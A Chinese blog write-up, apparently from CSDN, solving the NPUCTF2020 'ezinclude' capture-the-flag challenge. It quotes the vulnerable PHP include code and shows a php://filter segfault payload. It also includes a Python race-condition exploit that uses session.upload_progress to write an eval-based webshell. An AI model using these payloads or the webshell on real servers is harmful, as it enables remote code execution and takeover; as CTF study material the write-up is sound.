{"blogid": "126734136", "writerAge": "码龄1年", "writerBlogNum": "43", "writerCollect": "19", "writerComment": "2", "writerFan": "6", "writerGrade": "3级", "writerIntegral": "506", "writerName": "snowlyzz", "writerProfileAdress": "writer_image\\profile_126734136.jpg", "writerRankTotal": "37667", "writerRankWeekly": "10385", "writerThumb": "7", "writerVisitNum": "18550", "blog_read_count": "14", "blog_time": "已于 2022-09-07 09:41:14 修改", "blog_title": "[NPUCTF2020]ezinclude", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"-toc\" style=\"margin-left:0px;\"></p>\n<p id=\"%E5%89%8D%E8%A8%80%20%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E5%89%8D%E8%A8%80%20%EF%BC%9A\">前言 ：</a></p>\n<p id=\"-toc\" style=\"margin-left:0px;\"></p>\n<p id=\"%E8%80%83%E7%82%B9%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E8%80%83%E7%82%B9%EF%BC%9A\">考点：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E8%A7%A3%E9%A2%98%EF%BC%9A\">解题：</a></p>\n<p id=\"%E9%A2%84%E6%9C%9F%E8%A7%A3%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E9%A2%84%E6%9C%9F%E8%A7%A3%EF%BC%9A\">预期解：</a></p>\n<p id=\"%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%BA%8C%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%BA%8C%EF%BC%9A\">预期解二：</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<h1 id=\"%E5%89%8D%E8%A8%80%20%EF%BC%9A\">前言 ：</h1>\n<p>仅记录我刷题历程。</p>\n<h1></h1>\n<h1 id=\"%E8%80%83%E7%82%B9%EF%BC%9A\">考点：</h1>\n<p><strong>临时文件上传包含</strong></p>\n<p><strong>利用segment fault 导致 系统崩溃上传恶意文件</strong></p>\n<p><strong>session.upload_progress 上传临时文件</strong></p>\n<p></p>\n<h1 id=\"%E8%A7%A3%E9%A2%98%EF%BC%9A\">解题：</h1>\n<p>进入环境 说 用户和密码错误 ，抓包：</p>\n<p><img alt=\"\" height=\"312\" src=\"image\\e19a1767b3a4422488ea0fef41487d7a.png\" width=\"619\"/></p>\n<p>Hash  爆破是不太可能的。 给了  hash  直接传入pass。</p>\n<p><img alt=\"\" height=\"420\" src=\"image\\768c6ca9217f4579a50c9d83bd2a7ed4.png\" width=\"898\"/></p>\n<p> 访问 flflflflag.php<img alt=\"\" height=\"454\" src=\"image\\af3050c470b94a74a0332ac3f6131e98.png\" width=\"985\"/></p>\n<p> 有个包含 用伪协议读取 </p>\n<p><img alt=\"\" height=\"519\" src=\"image\\184b379171b04753a0138d91f510b05b.png\" width=\"1200\"/></p>\n<p></p>\n<pre><code class=\"language-php\">&lt;html&gt;\n&lt;head&gt;\n&lt;script language=\"javascript\" type=\"text/javascript\"&gt;\n           window.location.href=\"404.html\";\n&lt;/script&gt;\n&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;\n&lt;/head&gt;\n&lt;&gt;\n&lt;body&gt;\n&lt;?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h2 id=\"%E9%A2%84%E6%9C%9F%E8%A7%A3%EF%BC%9A\">预期解：</h2>\n<p>既然是包含  可以上传临时文件到 /tmp/下     文件名是PHP_xxxxxxxx 但是需要爆破。</p>\n<p>换另一种方法。</p>\n<p>扫目录，可以扫到dir.php 这个列出了 /tmp 下所有文件，可以利用php7  segment fault特性。</p>\n<blockquote>\n<p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>\n</blockquote>\n<blockquote>\n<p>php &lt; 7.2 </p>\n<p>php://filter/string.strip_tags/resource=/etc/passwd</p>\n<p></p>\n<p>php7 老版本通杀<br/> php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA<br/>  </p>\n</blockquote>\n<p>脚本：</p>\n<pre><code class=\"language-python\">import requests\nfrom io import BytesIO\nurl=\"http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\npayload=\"&lt;?php phpinfo();?&gt;\"\nfiles={\n    \"file\":BytesIO(payload.encode())\n}\nr=requests.post(url=url,files=files,allow_redirects=False) //禁止重定向\n\nprint(r.text)\n</code></pre>\n<p>运行后，看到已经让容器暂时崩溃：</p>\n<p><img alt=\"\" height=\"523\" src=\"image\\0d1f152d27b74ae9884f6a28b77daf0e.png\" width=\"680\"/></p>\n<p> 访问 dir.php 是能够看到我们上传的临时文件名字的。</p>\n<p><img alt=\"\" height=\"180\" src=\"image\\51e6d4cb407a461686ddcba540bb174b.png\" width=\"875\"/></p>\n<p> 访问，注意是tmp/  下：</p>\n<p><img alt=\"\" height=\"151\" src=\"image\\0d78914591374fb18fabdec805a9e326.png\" width=\"917\"/></p>\n<p><img alt=\"\" height=\"383\" src=\"image\\2686a936cdb74ca1a96f0357dcbc0102.png\" width=\"1155\"/></p>\n<h2 id=\"%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%BA%8C%EF%BC%9A\">预期解二：</h2>\n<p>利用session.upload_progress 进行 session 文件包含：</p>\n<p>详细的可以参考这篇好文章：<a href=\"https://www.freebuf.com/vuls/202819.html\" title=\"利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户\">利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户</a></p>\n<p>这里直接给上exp</p>\n<pre><code class=\"language-python\">import io\nimport sys\nimport requests\nimport threading\n\n\nhost = \"http://3e77e1cd-842a-43c8-90d4-58b0f5c394d9.node4.buuoj.cn:81/flflflflag.php\"\nsessid = 'snowy'\ndef POST(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)\n        session.post(\n            host,\n            data={\n                \"PHP_SESSION_UPLOAD_PROGRESS\": \"&lt;?php system('ls /');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');echo md5('1');?&gt;\"},\n            files={\"file\": ('a.txt', f)},\n            cookies={'PHPSESSID': sessid}\n\n        )\ndef READ(session):\n    while True:\n        response = session.get(f'{host}?file=/tmp/sess_{sessid}')\n        # print(response.text)\n        if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text:\n            print('[+++]retry')\n        else:\n            print(response.text)\n            sys.exit(0)\n\nwith requests.session() as session:\n    t1 = threading.Thread(target=POST, args=(session, ))\n    t1.daemon = True\n    t1.start()\n    READ(session)</code></pre>\n<p>进入 shell.php  执行phpinfo就能看到flag</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n</div>\n</div>"}